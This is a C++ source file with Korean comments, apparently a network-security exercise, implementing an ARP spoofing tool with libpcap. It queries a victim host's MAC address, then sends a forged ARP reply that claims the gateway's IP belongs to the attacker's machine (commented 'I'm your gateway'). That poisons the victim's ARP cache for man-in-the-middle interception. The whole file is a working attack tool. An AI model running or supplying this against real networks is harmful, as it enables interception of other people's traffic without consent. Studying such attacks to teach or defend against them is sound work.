// send-arp-main.cpp

#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac_ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    // 나의 MAC주소, IP주소 가져오기
    char myMacStr[32] = {0, };
	char myIpStr[32] = {0, };
	if(get_mac(myMacStr, dev) < 0)
    {
        fprintf(stderr, "get_mac() Error!!\n");
        return -1;
    }
	if(get_ip_addr(myIpStr, dev) < 0)
    {
        fprintf(stderr, "get_ip_addr() Error!!\n");
        return -1;
    }
    Mac myMac = Mac(myMacStr);
    Ip myIp = Ip(myIpStr);
    
    // sender의 MAC주소 알아오기
    
    // 패킷 제작
	EthArpPacket sendPacket;

	sendPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");  //  리퀘스트 \('o')/ 브로드캐스트
	sendPacket.eth_.smac_ = Mac(myMacStr);
	sendPacket.eth_.type_ = htons(EthHdr::Arp);

	sendPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	sendPacket.arp_.pro_ = htons(EthHdr::Ip4);
	sendPacket.arp_.hln_ = Mac::SIZE;
	sendPacket.arp_.pln_ = Ip::SIZE;
	sendPacket.arp_.op_ = htons(ArpHdr::Request);  // 너의 맥을 알려줘
	sendPacket.arp_.smac_ = Mac(myMacStr);
	sendPacket.arp_.sip_ = htonl(Ip(myIpStr));
	sendPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	sendPacket.arp_.tip_ = htonl(Ip(argv[2]));  // sender IP

    // 패킷 전송
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendPacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	EthArpPacket* recvPacket = NULL;
    // 패킷 수신
    while(true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        printf("%u bytes captured\n", header->caplen);
        
        // arp reply 확인하고 맥 주소 확인
		recvPacket = (EthArpPacket*)packet;
		if(recvPacket->eth_.type_ != htons(EthHdr::Arp))
			continue;  // not arp, skip
		if(recvPacket->arp_.op_ != htons(ArpHdr::Reply))
			continue;  // not arp reply, skip
		if( recvPacket->arp_.sip_ != htonl(Ip(argv[2])) )
			continue;  // other ip, skip

		break;
    }
	Mac senderMac = Mac(recvPacket->arp_.smac_);

	sendPacket.eth_.dmac_ = senderMac;
	sendPacket.eth_.smac_ = Mac(myMacStr);
	sendPacket.eth_.type_ = htons(EthHdr::Arp);

	sendPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	sendPacket.arp_.pro_ = htons(EthHdr::Ip4);
	sendPacket.arp_.hln_ = Mac::SIZE;
	sendPacket.arp_.pln_ = Ip::SIZE;
	sendPacket.arp_.op_ = htons(ArpHdr::Reply);  // 리플라이 \\('o') 유니캐스트
	sendPacket.arp_.smac_ = Mac(myMacStr);
	sendPacket.arp_.sip_ = htonl(Ip(argv[3]));  // I'm your gateway
	sendPacket.arp_.tmac_ = senderMac;
	sendPacket.arp_.tip_ = htonl(Ip(argv[2]));  // sender IP
    
    // 패킷 전송
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendPacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
